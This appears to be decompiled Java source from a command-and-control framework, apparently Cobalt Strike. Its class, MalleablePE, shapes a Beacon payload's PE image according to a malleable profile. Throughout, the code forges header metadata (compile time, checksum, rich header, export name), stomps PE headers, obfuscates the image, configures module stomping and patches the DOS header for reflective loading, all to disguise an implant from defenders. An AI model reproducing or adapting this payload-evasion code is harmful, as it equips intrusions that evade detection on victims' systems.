package pe;

import c2profile.Profile;
import c2profile.Program;
import c2profile.SmartBuffer;
import common.CommonUtils;
import java.util.Arrays;
import java.util.Iterator;

public class MalleablePE {
   Profile profile;

   public MalleablePE(Profile var1) {
      this.profile = var1;
   }

   public byte[] strings(byte[] var1) {
      String var2 = CommonUtils.bString(var1);
      int var3 = var2.indexOf("TTTTSSSSUUUUVVVVWWWWXXXXYYYYZZZZ");
      if (var3 == -1) {
         CommonUtils.print_error("new string table not found (MalleablePE)");
         return var1;
      } else {
         SmartBuffer var4 = this.profile.getToString(".stage").copy();
         Iterator var5 = var4.iterator();

         while(var5.hasNext()) {
            String var6 = CommonUtils.bString((byte[])((byte[])var5.next())).trim();
            if (CommonUtils.isin(var6, var2)) {
               var5.remove();
            }
         }

         byte[] var8 = CommonUtils.padg(var4.getBytes(), 4096);
         if (var8.length > 4096) {
            int var7 = var8.length;
            var8 = Arrays.copyOfRange(var8, 0, 4096);
            CommonUtils.print_warn("Truncated PE strings table to " + var8.length + " bytes from " + var7 + " bytes");
         }

         var2 = CommonUtils.replaceAt(var2, CommonUtils.bString(var8), var3);
         return CommonUtils.toBytes(var2);
      }
   }

   public byte[] process(byte[] var1, String var2) {
      var1 = this.pre_process(var1, var2);
      return this.post_process(var1, var2);
   }

   public byte[] pre_process(byte[] var1, String var2) {
      var1 = this.strings(var1);
      boolean var3 = this.profile.option(".stage.userwx");
      int var4 = this.profile.getInt(".stage.image_size_" + var2);
      String var5 = this.profile.getString(".stage.compile_time");
      boolean var6 = this.profile.option(".stage.obfuscate");
      String var7 = this.profile.getString(".stage.name");
      int var8 = this.profile.getInt(".stage.checksum");
      String var9 = this.profile.getString(".stage.module_" + var2);
      boolean var10 = this.profile.option(".stage.stomppe");
      String var11 = this.profile.getString(".stage.rich_header");
      int var12 = this.profile.getInt(".stage.entry_point");
      PEEditor var13 = new PEEditor(var1);
      var13.checkAssertions();
      if (!"<DEFAULT>".equals(var11)) {
         var13.insertRichHeader(CommonUtils.toBytes(var11));
      }

      if (var10) {
         var13.stompPE();
      }

      if (var3) {
         var13.setRWXHint(var3);
      }

      if (!var5.equals("")) {
         var13.setCompileTime(var5);
      }

      if (var4 > 0) {
         var13.setImageSize((long)var4);
      }

      if (var8 > 0) {
         var13.setChecksum((long)var8);
      }

      if (!var7.equals("")) {
         var13.setExportName(var7);
      }

      if (var12 >= 0) {
         var13.setEntryPoint((long)var12);
      }

      var13.obfuscate(var6);
      if (!var9.equals("")) {
         var13.setModuleStomp(var9);
      }

      return var13.getImage();
   }

   public byte[] post_process(byte[] var1, String var2) {
      byte[] var3;
      String var4;
      if ("x86".equals(var2)) {
         var3 = BeaconLoader.patchDOSHeader(var1);
         var4 = ".stage.transform-x86";
      } else if ("x64".equals(var2)) {
         var3 = BeaconLoader.patchDOSHeaderX64(var1);
         var4 = ".stage.transform-x64";
      } else {
         var4 = "";
         var3 = new byte[0];
      }

      Program var5 = this.profile.getProgram(var4);
      return var5 == null ? var3 : var5.transformData(var3);
   }
}
